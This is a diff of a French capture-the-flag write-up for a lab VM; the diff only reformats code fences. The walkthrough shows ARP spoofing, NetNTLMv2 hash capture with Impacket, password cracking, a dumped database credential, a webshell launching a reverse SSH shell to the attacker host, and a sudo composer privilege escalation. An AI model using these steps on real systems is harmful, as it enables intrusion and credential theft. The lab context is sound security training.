@@ -10,7 +10,7 @@ Après [le précédent CTF]({% link _posts/2022-02-07-Solution-du-CTF-Snowtalks-
 
 Le *Snowtalks Medium* se présente (comme son nom l'indique) comme un CTF de difficulté intermédiaire.  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.24 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 13:42 CET 
 Nmap scan report for 192.168.56.24 
@@ -52,7 +52,7 @@ Ma première réaction fut de dégainer *feroxbuster* à la recherche d'éventue
 
 J'ai par la suite tenté d'extraire des informations utile du Wordpress à l'aide de *wpscan* mais n'ai rien eu de bien utile comme la liste des thèmes installés ou la version du logiciel :  
 
-```plain
+```
 [+] WordPress version 5.8.3 identified (Latest, released on 2022-01-06). 
  | Found By: Rss Generator (Passive Detection) 
  |  - http://snow-med/index.php/feed/, <generator>https://wordpress.org/?v=5.8.3</generator> 
@@ -73,7 +73,7 @@ docker run --add-host snow-med:192.168.56.24 -it --rm wpscanteam/wpscan --url ht
 
 Le module d'énumération *Wordpress* de Wapiti fonctionne sur la même idée que le mode *aggresive* :  
 
-```plain
+```
 $ wapiti -u http://192.168.56.24/ -m wp_enum
 ujson module not found, using json 
 msgpack not installed, MsgPackSerializer unavailable 
@@ -115,7 +115,7 @@ sudo tshark -i vboxnet0
 
 Après un moment j'ai remarqué que la VM tentait de se connecter sur les ports SMB du router VirtualBox (si la VM est configurée en mode *Réseau privé hôte*, VirtualBox défini une IP pour un routeur virtuel).  
 
-```plain
+```
     9 147.411538079 192.168.56.24 → 192.168.56.1 TCP 74 44644 → 445 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3050540630 TSecr=0 WS=128 
    10 147.411609532 192.168.56.1 → 192.168.56.24 TCP 54 445 → 44644 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0 
    11 147.430322712 192.168.56.24 → 192.168.56.1 TCP 74 38828 → 139 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3050540648 TSecr=0 WS=128 
@@ -136,7 +136,7 @@ docker run -it --privileged --net=host bettercap/bettercap -iface vboxnet0
 
 Sans être expert Docker je suppose que l'option *--net=host* intègre les interfaces de l'hôte dans le container. Il faut ensuite définir notre cible et activer le ARP spoofing :  
 
-```plain
+```
 192.168.56.0/24 > 192.168.56.1  » [14:57:34] [sys.log] [war] Could not find mac for  
 192.168.56.0/24 > 192.168.56.1  » set arp.spoof.targets 192.168.56.24 
 192.168.56.0/24 > 192.168.56.1  » arp.spoof on 
@@ -147,7 +147,7 @@ Sans être expert Docker je suppose que l'option *--net=host* intègre les inter
 
 On peut si on le souhaite ouvrir un petit tshark / wireshark pour voir le spoofing à l'oeuvre. Après on utilise le serveur SMB de Impacket en mode debug pour obtenir les éventuels hashs *netntlmv2* :  
 
-```plain
+```
 $ sudo python examples/smbserver.py -debug -smb2support yolo /tmp/jail/
 
 Impacket v0.9.22.dev1+20200424.150528.c44901d1 - Copyright 2020 SecureAuth Corporation 
@@ -177,7 +177,7 @@ C'est tout pour cette aparté qui vous sera peut être utile une jour :)
 
 On peut casser le hash avec *John The Ripper*. L'avantage de JTR est qu'il se charge de détecter le type de hash comme un grand :  
 
-```plain
+```
 $ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt  
 Using default input encoding: UTF-8 
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) 
@@ -191,7 +191,7 @@ Session completed.
 
 Ayé, on peut se connecter sur le SSH :  
 
-```plain
+```
 bonkachu@snow-med:~$ crontab -l 
 */5 * * * * /home/bonkachu/.../share.sh 
 bonkachu@snow-med:~$ cat /home/bonkachu/.../share.sh 
@@ -207,7 +207,7 @@ Apache... 2
 
 On a différents services en écoute sur la machine :  
 
-```plain
+```
 bonkachu@snow-med:~$ ss -lntp 
 State                    Recv-Q                   Send-Q                 Local Address:Port               Peer Address:Port
 LISTEN                   0                        128                          0.0.0.0:22                      0.0.0.0:*
@@ -237,7 +237,7 @@ define( 'DB_HOST', 'localhost' );
 
 On peut ainsi récupérer le hash de l'admin Wordpress :  
 
-```plain
+```
 bonkachu@snow-med:/var/www/html$ mysql -u webuser -pHiLoYLOu7456 wordpress 
 mysql: [Warning] Using a password on the command line interface can be insecure. 
 Reading table information for completion of table and column names 
@@ -268,7 +268,7 @@ J'ai tenté de le casser mais cela n'a rien donné. L'utilisateur MySQL a assez 
 
 Reste le port 9090 qui est un second hôte virtuel d'Apache :  
 
-```plain
+```
 bonkachu@snow-med:~$ cd /etc/apache2/sites-enabled/    
 bonkachu@snow-med:/etc/apache2/sites-enabled$ ls 
 000-default.conf  coffeez.conf 
@@ -307,7 +307,7 @@ Pour en avoir plus on va bruteforcer ce site mais il faut d'abord forwarder le p
 ssh -N -L 9090:127.0.0.1:9090 bonkachu@192.168.56.24
 ```
 
-```plain
+```
 $ feroxbuster -u http://127.0.0.1:9090/ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 
  ___  ___  __   __     __      __         __   ___
@@ -349,20 +349,20 @@ by Ben "epi" Risher 🤓                 ver: 2.4.0
 
 L'argument à passer sur ce webshell se devine facilement :  
 
-```plain
+```
 $ curl 'http://127.0.0.1:9090/cmd.php?cmd=id'
 uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(coffeez)
 ```
 
 J'ai uploadé un ReverseSSH sur la VM puis l'ai exécuté via le webshell :  
 
-```plain
+```
 curl "http://127.0.0.1:9090/cmd.php?cmd=/dev/shm/reverse-sshx64+-v+-p+7777+192.168.56.1+2>%261"
 ```
 
 Une fois le shell PTY obtenu je liste les fichiers du groupe *coffeez* vu que l'on dispose des droits :  
 
-```plain
+```
 www-data@snow-med:/home/coffeez/www$ find / -group coffeez 2> /dev/null | grep -v /proc/ 
 /home/coffeez 
 /home/coffeez/.local 
@@ -380,7 +380,7 @@ Dragon Slayer
 
 L'archive ZIP demande un mot de passe si on tente de la décompresser. *zip2john* et *JtR* à la rescousse :  
 
-```plain
+```
 $ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt  
 Using default input encoding: UTF-8 
 Loaded 1 password hash (PKZIP [32/64]) 
@@ -412,7 +412,7 @@ Ceux ci permettent l'accès SSH sur le compte *coffeez*.
 
 L'utilisateur peur *composer* :  
 
-```plain
+```
 coffeez@snow-med:~$ sudo -l 
 [sudo] password for coffeez:  
 Matching Defaults entries for coffeez on snow-med: 
@@ -424,7 +424,7 @@ User coffeez may run the following commands on snow-med:
 
 Cette commande ne m'évoque pour ainsi dire rien :  
 
-```plain
+```
 coffeez@snow-med:~$ composer help 
 Usage: 
   help [options] [--] [<command_name>] 
@@ -471,7 +471,7 @@ La documentation décrit aussi comment on peut définir [les scripts via une lis
 
 J'avoue que j'ai préféré me baser sur le GTFObin pour avoir un exemple tout fait :  
 
-```plain
+```
 coffeez@snow-med:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json    
 coffeez@snow-med:~$ sudo /usr/local/bin/composer --working-dir=. run-script x 
 [sudo] password for coffeez:  
